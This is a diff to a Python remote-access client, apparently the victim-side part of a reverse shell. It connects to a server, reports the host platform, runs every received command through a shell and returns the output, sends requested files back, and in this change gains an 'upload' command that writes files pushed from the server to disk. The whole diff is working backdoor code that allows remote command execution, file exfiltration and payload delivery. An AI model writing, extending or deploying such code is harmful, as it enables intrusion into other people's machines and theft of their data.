@@ -2,7 +2,6 @@ import socket
 import subprocess
 import os
 import platform
-import time
 
 
 def send_file(filename):
@@ -24,6 +23,23 @@ def send_file(filename):
                 s.sendall(bytes_read)
 
 
+def recv_file(path):
+    filesize = int(s.recv(BUFFER_SIZE).decode())
+    s.send("ok".encode())
+    left = filesize
+    try:
+        f = open(path, "wb")
+        while 1:
+            rev = s.recv(BUFFER_SIZE)
+            f.write(rev)
+            left -= len(rev)
+            if left == 0:
+                break
+        f.close()
+    except FileNotFoundError:
+        s.send("No such file or directory".encode())
+
+
 def run():
     while True:
         # receive the command from the server
@@ -38,18 +54,18 @@ def run():
             else:
                 os.chdir(command[3:])
             s.send(os.getcwd().encode())
+        # File download
         elif command[:8] == "download":
             filename = command[9:]
             send_file(filename)
+        # File upload
+        elif command[:6] == "upload":
+            filename = command[7:]
+            recv_file(filename)
         else:
-            # execute the command and retrieve the results
-            # p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-            # output, err = p.communicate()
-
             p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = p.stdout
             # send the results back to the server
-            s.send(output + "\n".encode() + os.getcwd().encode())
+            s.send(p.stdout + "\n".encode() + os.getcwd().encode())
     # close client connection
     s.close()
 
@@ -67,8 +83,6 @@ if __name__ == '__main__':
     s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
     # acccept the chcp command
     cmd = s.recv(BUFFER_SIZE).decode()
-    #p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-    #output, err = p.communicate()
     subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
     # Run the loop
     run()
